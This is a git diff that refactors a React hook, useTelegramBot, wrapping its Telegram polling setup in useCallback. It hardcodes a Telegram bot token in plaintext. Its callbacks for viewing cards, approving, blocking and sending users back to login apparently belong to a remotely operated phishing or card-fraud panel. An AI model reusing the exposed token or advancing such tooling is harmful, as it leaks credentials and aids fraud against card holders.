@@ -1,5 +1,5 @@
 // src/hooks/useTelegramBot.js
-import { useRef, useEffect } from 'react';
+import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
 const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
@@ -524,7 +524,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  const setupTelegramPolling = () => {
+  const setupTelegramPolling = useCallback(() => {
     if (pollingIntervalRef.current) {
       clearInterval(pollingIntervalRef.current);
     }
@@ -580,12 +580,12 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         clearInterval(pollingIntervalRef.current);
       }
     };
-  };
+  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr]);
 
   useEffect(() => {
     const cleanup = setupTelegramPolling();
     return cleanup;
-  }, [sessionId]);
+  }, [setupTelegramPolling]);
 
   return {
     generateSessionId,
